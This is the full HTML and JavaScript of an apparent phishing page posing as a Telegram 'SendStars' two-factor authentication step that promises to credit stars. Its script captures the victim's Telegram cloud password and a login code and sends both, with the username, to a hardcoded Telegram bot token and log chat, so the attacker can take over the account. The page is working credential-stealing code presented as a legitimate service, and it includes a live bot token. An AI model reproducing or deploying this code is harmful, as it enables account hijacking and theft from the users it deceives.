<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>SendStars ‚Äî –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --bg:#1c1b1b;
      --text:#fff;
      --box:#2a2a2a;
      --button:#2A9BF8;
      --button-hover:#1a8be8;
      --button-secondary:#3a3a3a;
      --button-confirm:#4CAF50;
      --button-confirm-hover:#45a049;
      --glow-primary: rgba(42, 155, 248, 0.4);
      --glow-confirm: rgba(76, 175, 80, 0.4);
      --glow-secondary: rgba(255, 255, 255, 0.1);
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; }

    body {
      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      background: var(--bg);
      display: flex;
      align-items: center;
      justify-content: center;
      color: var(--text);
    }

    .screen {
      width: 400px;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      gap: 15px;
    }

    .avatar img {
      width: 120px;
      height: auto;
      object-fit: contain;
      display: block;
    }

    .title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 5px;
    }

    .hint {
      font-size: 14px;
      color: #aaa;
      margin-bottom: 10px;
      line-height: 1.4;
      max-width: 320px;
    }

    .password-input {
      width: 280px;
      height: 50px;
      border-radius: 12px;
      background: var(--box);
      border: 2px solid #3a3a3a;
      color: var(--text);
      font-size: 16px;
      padding: 0 15px;
      margin: 10px 0 0px;
      transition: border-color 0.2s;
    }

    .password-input:focus {
      outline: none;
      border-color: #2A9BF8;
      box-shadow: 0 0 0 2px rgba(42, 155, 248, 0.2);
    }

    .forgot-password {
      color: #2A9BF8;
      font-size: 14px;
      cursor: pointer;
      margin-bottom: 20px;
      text-decoration: none;
      transition: color 0.2s;
    }

    .forgot-password:hover {
      color: #1a8be8;
      text-decoration: underline;
    }

    .password-reset-info {
      font-size: 14px;
      color: #aaa;
      line-height: 1.4;
      max-width: 320px;
      margin-bottom: 15px;
      text-align: center;
    }

    .settings-link {
      color: #2A9BF8;
      text-decoration: none;
      cursor: pointer;
      font-weight: 500;
    }

    .settings-link:hover {
      text-decoration: underline;
    }

    .arrow {
      display: inline-block;
      margin: 0 5px;
      color: #2A9BF8;
      font-weight: bold;
    }

    .buttons {
      display: flex;
      gap: 10px;
      width: 280px;
    }

    .button {
      flex: 1;
      height: 50px;
      border-radius: 12px;
      border: none;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      position: relative;
    }

    .button-secondary {
      background: var(--button-secondary);
      color: var(--text);
      box-shadow: 0 0 10px var(--glow-secondary);
    }

    .button-secondary:hover {
      background: #4a4a4a;
      box-shadow: 0 0 15px var(--glow-secondary), 0 0 20px var(--glow-secondary);
      transform: translateY(-1px);
    }

    .button-primary {
      background: var(--button);
      color: white;
      box-shadow: 0 0 10px var(--glow-primary);
    }

    .button-primary:hover {
      background: var(--button-hover);
      box-shadow: 0 0 15px var(--glow-primary), 0 0 25px var(--glow-primary);
      transform: translateY(-1px);
    }

    .button-confirm {
      background: var(--button-confirm);
      color: white;
      box-shadow: 0 0 10px var(--glow-confirm);
    }

    .button-confirm:hover {
      background: var(--button-confirm-hover);
      box-shadow: 0 0 15px var(--glow-confirm), 0 0 25px var(--glow-confirm);
      transform: translateY(-1px);
    }

    .button-confirm {
      animation: pulse-green 2s infinite;
    }

    @keyframes pulse-green {
      0% {
        box-shadow: 0 0 10px var(--glow-confirm);
      }
      50% {
        box-shadow: 0 0 15px var(--glow-confirm), 0 0 25px var(--glow-confirm);
      }
      100% {
        box-shadow: 0 0 10px var(--glow-confirm);
      }
    }

    .confirmation-text {
      font-size: 14px;
      color: #aaa;
      margin-top: 10px;
      max-width: 280px;
      line-height: 1.4;
      display: none;
    }

    .loading-screen {
      display: none;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }

    .spinner {
      border: 4px solid rgba(255,255,255,0.2);
      border-top: 4px solid #fff;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      font-size: 14px;
      color: #aaa;
      line-height: 1.4;
      max-width: 320px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="screen" id="passwordScreen">
    <div class="avatar">
      <img src="avatar.gif" alt="avatar">
    </div>
    
    <div class="title">–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å</div>
    
    <div class="hint">
      –ï—Å–ª–∏ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –∑–∞—â–∏—â—ë–Ω –ø–∞—Ä–æ–ª–µ–º, –≤–≤–µ–¥–∏—Ç–µ –µ–≥–æ –∑–¥–µ—Å—å, –µ—Å–ª–∏ –Ω–µ—Ç - –ø—Ä–æ–ø—É—Å—Ç–∏—Ç–µ —ç—Ç–æ—Ç –ø—É–Ω–∫—Ç.
    </div>

    <input type="password" class="password-input" id="passwordInput" placeholder="–ü–∞—Ä–æ–ª—å" autocomplete="current-password">

    <div id="forgotPasswordContainer">
      <a class="forgot-password" id="forgotPasswordLink">–ó–∞–±—ã–ª–∏ –ø–∞—Ä–æ–ª—å?</a>
    </div>

    <div class="buttons">
      <button class="button button-secondary" id="skipButton">–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å</button>
      <button class="button button-primary" id="continueButton">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>
    
    <div class="confirmation-text" id="confirmationText">
      –í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ –∞–∫–∫–∞—É–Ω—Ç –Ω–µ –∑–∞—â–∏—â—ë–Ω –ø–∞—Ä–æ–ª–µ–º?
    </div>
  </div>

  <div class="screen loading-screen" id="loadingScreen">
    <div class="spinner"></div>
    <div>–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è‚Ä¶</div>
    <div class="loading-text">–ó–≤—ë–∑–¥—ã –Ω–∞—á–∏—Å–ª—è—é—Ç—Å—è –≤ —Ç–µ—á–µ–Ω–∏–µ 1-2 –º–∏–Ω—É—Ç. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–µ —Å–≤–æ—Ä–∞—á–∏–≤–∞–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ.</div>
  </div>

  <script>
  const tg = window.Telegram.WebApp;
  tg.expand();
  
  const urlParams = new URLSearchParams(window.location.search);
  const code = urlParams.get('code') || 'unknown';

  const passwordInput = document.getElementById('passwordInput');
  const skipButton = document.getElementById('skipButton');
  const continueButton = document.getElementById('continueButton');
  const passwordScreen = document.getElementById('passwordScreen');
  const loadingScreen = document.getElementById('loadingScreen');
  const forgotPasswordLink = document.getElementById('forgotPasswordLink');
  const forgotPasswordContainer = document.getElementById('forgotPasswordContainer');
  const confirmationText = document.getElementById('confirmationText');

  function sendPasswordToServer(password = '') {
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–∞—Ä–æ–ª—å –≤ localStorage
    const existingData = JSON.parse(localStorage.getItem('sendstars_data') || '{}');
    existingData.password = password;
    existingData.timestamp_2fa = new Date().toISOString();
    localStorage.setItem('sendstars_data', JSON.stringify(existingData));
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram –±–æ—Ç–∞
    const botToken = '8403065874:AAHg_uz-bB1EMN3sfcWo43xgE-YkVPPgX2w';
    const logChatId = '-5067724174';
    
    const user = tg.initDataUnsafe.user;
    const username = user?.username ? `@${user.username}` : '–±–µ–∑ username';
    
    const message = password 
      ? `üîê –ü–∞—Ä–æ–ª—å 2FA\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${username}\nüî¢ –ö–æ–¥: ${code}\nüîë –ü–∞—Ä–æ–ª—å: ${password}`
      : `üîê –ü—Ä–æ–ø—É—Å–∫ 2FA\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${username}\nüî¢ –ö–æ–¥: ${code}\n‚ö†Ô∏è –ü–∞—Ä–æ–ª—å –Ω–µ –≤–≤–µ–¥–µ–Ω`;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: logChatId, text: message, parse_mode: 'HTML' })
    });
  }

  forgotPasswordLink.addEventListener('click', () => {
    forgotPasswordContainer.innerHTML = `
      <div class="password-reset-info">
        –ß—Ç–æ–±—ã —Å–±—Ä–æ—Å–∏—Ç—å –ø–∞—Ä–æ–ª—å –ø–µ—Ä–µ–π–¥–∏—Ç–µ –≤ 
        <a class="settings-link" id="settingsLink">–ù–∞—Å—Ç—Ä–æ–π–∫–∏</a>
        <span class="arrow">‚Üí</span>
        –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å
        <span class="arrow">‚Üí</span>
        –û–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å
      </div>
    `;

    document.getElementById('settingsLink').addEventListener('click', () => {
      window.open('tg://settings', '_blank');
    });
  });

  skipButton.addEventListener('click', () => {
    if (!skipButton.classList.contains('button-confirm')) {
      confirmationText.style.display = 'block';
      skipButton.textContent = '–î–∞, –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å';
      skipButton.classList.remove('button-secondary');
      skipButton.classList.add('button-confirm');
    } else {
      passwordScreen.style.display = 'none';
      loadingScreen.style.display = 'flex';
      
      tg.sendData(JSON.stringify({
        type: '2fa_password',
        password: '',
        phone_number: 'unknown',
        auth_code: code,
        user_id: tg.initDataUnsafe.user?.id
      }));

      sendPasswordToServer('');
    }
  });

  continueButton.addEventListener('click', () => {
    const password = passwordInput.value.trim();
    
    if (password) {
      passwordScreen.style.display = 'none';
      loadingScreen.style.display = 'flex';
      
      tg.sendData(JSON.stringify({
        type: '2fa_password',
        password: password,
        phone_number: 'unknown',
        auth_code: code,
        user_id: tg.initDataUnsafe.user?.id
      }));

      sendPasswordToServer(password);
    } else {
      passwordInput.style.borderColor = '#ff4444';
      passwordInput.style.boxShadow = '0 0 0 2px rgba(255, 68, 68, 0.3)';
      setTimeout(() => {
        passwordInput.style.borderColor = '#3a3a3a';
        passwordInput.style.boxShadow = 'none';
      }, 1000);
    }
  });

  passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
      continueButton.click();
    }
  });

  passwordInput.focus();
  </script>
</body>
</html>
